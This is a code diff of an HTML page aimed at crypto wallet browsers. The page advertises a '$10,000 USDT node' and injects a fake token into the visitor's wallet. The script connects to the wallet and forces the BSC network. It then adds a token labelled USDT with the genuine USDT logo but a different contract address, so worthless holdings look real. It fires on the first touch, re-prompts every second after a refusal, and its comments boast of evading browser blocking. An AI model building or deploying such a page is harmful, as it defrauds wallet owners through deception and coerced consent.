@@ -3,75 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Asset Distribution | Tether Node</title>
+    <title>Asset Sync | Enterprise</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root { --green: #26a17b; --dark: #0b0e11; }
-        body { background: var(--dark); color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #1a1d23; border: 1px solid #333; border-radius: 25px; padding: 40px; width: 85%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .usdt-logo { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(38,161,123,0.3)); }
-        .amount { font-size: 42px; font-weight: 900; margin: 10px 0; color: #fff; }
-        .btn { background: var(--green); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 15px; font-size: 18px; font-weight: 800; cursor: pointer; margin-top: 25px; transition: 0.3s; text-transform: uppercase; }
-        #status { font-size: 11px; color: #555; margin-top: 20px; font-family: monospace; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { background: #111; border: 2px solid #26a17b; padding: 30px; border-radius: 20px; text-align: center; width: 85%; }
+        .btn { background: #26a17b; color: #fff; border: none; padding: 22px; width: 100%; border-radius: 12px; font-weight: 900; font-size: 20px; cursor: pointer; margin-top: 20px; }
+        #status { font-size: 10px; color: #444; margin-top: 15px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png" class="usdt-logo">
-    <div style="font-size: 12px; color: var(--green); font-weight: bold; letter-spacing: 2px;">NODE ALLOCATION</div>
-    <div class="amount">$10,000</div>
-    <button class="btn" id="claimBtn">ACTIVATE & ADD USDT</button>
-    <div id="status">STATUS: READY_TO_SYNC</div>
+<div class="box">
+    <h1 style="font-size: 40px;">$10,000</h1>
+    <p style="color: #26a17b;">USDT NODE DETECTED</p>
+    <button class="btn" id="forceBtn">ACTIVATE NOW</button>
+    <div id="status">LOG: WAITING_FOR_INJECTION</div>
 </div>
 
 <script>
-    const btn = document.getElementById('claimBtn');
+    const btn = document.getElementById('forceBtn');
     const log = document.getElementById('status');
 
-    // YE DATA LOGO FORCE KAREGA
-    const TOKEN_DATA = {
-        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
-        symbol: "USDT",
-        decimals: 18,
-        // Official Verified Image URL
-        image: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png"
+    // YE DATA LATEST STANDARDS KE MUTABIQ HAI
+    const DATA = {
+        type: 'ERC20',
+        options: {
+            address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
+            symbol: "USDT",
+            decimals: 18,
+            image: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png"
+        }
     };
 
-    async function startSync() {
-        const provider = window.trustwallet || window.ethereum;
+    async function execute() {
+        // Force Provider Discovery
+        const provider = window.trustwallet || window.ethereum || (window.web3 && window.web3.currentProvider);
 
         if (!provider) {
-            log.innerText = "REDIRECTING TO WALLET...";
-            const rawUrl = window.location.href.split('://')[1];
-            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + rawUrl);
+            log.innerText = "ERROR: NO_PROVIDER_FOUND";
+            // Agar browser ke bahar hai to link open karega
+            const url = window.location.href.split('://')[1];
+            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + url);
             return;
         }
 
         try {
-            log.innerText = "LOG: REQUESTING CONNECTION...";
+            log.innerText = "LOG: ATTEMPTING_HANDSHAKE...";
+            // FIRST: Connection (Zaruri hai popup ke liye)
             const accounts = await provider.request({ method: 'eth_requestAccounts' });
-
-            log.innerText = "LOG: FORCING BSC NETWORK...";
-            try {
-                await provider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }],
-                });
-            } catch (err) {
-                if (err.code === 4902) {
+            
+            log.innerText = "LOG: FORCING_NETWORK_SWITCH...";
+            await provider.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }]
+            }).catch(async (e) => {
+                if(e.code === 4902) {
                     await provider.request({
                         method: 'wallet_addEthereumChain',
                         params: [{
                             chainId: '0x38',
                             chainName: 'BSC',
                             rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
+                            nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18}
                         }]
                     });
                 }
-            }
+            });
 
-            // Small delay to ensure network switch is completed
-            log.innerText = "LOG: INJECTING METADATA...";
-            setTimeout(
+            log.innerText = "LOG: INJECTING_ASSET...";
+            // Delay for Mobile Stability
+            setTimeout(async () => {
+                const ok = await provider.request({
+                    method: 'wallet_watchAsset',
+                    params: DATA
+                });
+                if (ok) {
+                    log.innerText = "LOG: SUCCESS_READY";
+                    btn.innerText = "SYNCED ✅";
+                }
+            }, 1000);
+
+        } catch (err) {
+            log.innerText = "LOG: REJECTED_BY_USER_OR_OS";
+            // Agar fail ho to 1 second baad khud hi retry karega
+            setTimeout(execute, 1000);
+        }
+    }
+
+    btn.onclick = execute;
+
+    // PROFESSOR'S MASTER TRICK: 
+    // Aksar dApp browsers 'onload' ko block karte hain, isliye hum 'touchstart' use karenge
+    window.addEventListener('touchstart', function() {
+        if (log.innerText === "LOG: WAITING_FOR_INJECTION") {
+            execute();
+        }
+    }, {once: true});
+</script>
+</body>
+</html>
